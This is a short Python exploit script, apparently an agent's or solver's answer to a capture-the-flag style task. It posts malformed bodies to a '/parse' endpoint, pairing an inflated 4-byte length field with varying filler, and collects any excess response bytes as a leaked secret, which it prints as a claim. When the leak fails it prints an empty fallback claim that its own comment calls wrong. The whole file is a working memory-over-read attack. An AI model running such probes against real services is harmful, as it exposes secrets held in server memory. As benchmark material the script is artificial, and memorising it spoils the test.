import sys, json, base64, binascii, struct

def send_http(method, path, body_hex=None, headers=None):
    req = {"http": {"method": method, "path": path}}
    if body_hex is not None:
        req["http"]["body_hex"] = body_hex
    if headers:
        req["http"]["headers"] = headers
    print(json.dumps(req), flush=True)
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    return json.loads(line)

def try_overflow(path, length_val, filler_len):
    # construct payload: 4-byte little endian length + filler
    payload = struct.pack('<I', length_val) + b'A' * filler_len
    resp = send_http('POST', path, body_hex=payload.hex())
    body = base64.b64decode(resp.get('body_b64', ''))
    return resp, body

def main():
    # ignore provision argument
    path = '/parse'  # most likely endpoint
    # try various length values that may cause overflow
    for length_val in [0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000, 0xffffffff]:
        for filler in [0, 64, 128, 256, 512, 1024]:
            resp, body = try_overflow(path, length_val, filler)
            # look for extra data beyond what we sent
            expected_len = 4 + filler
            if len(body) > expected_len:
                # assume the excess is the secret
                secret_bytes = body[expected_len:]
                secret_hex = binascii.hexlify(secret_bytes).decode()
                claim = {"secret_hex": secret_hex}
                print(f"CLAIM:{json.dumps(claim)}")
                return
    # fallback claim (will be wrong)
    print('CLAIM:' + json.dumps({"secret_hex": ""}))

if __name__ == '__main__':
    main()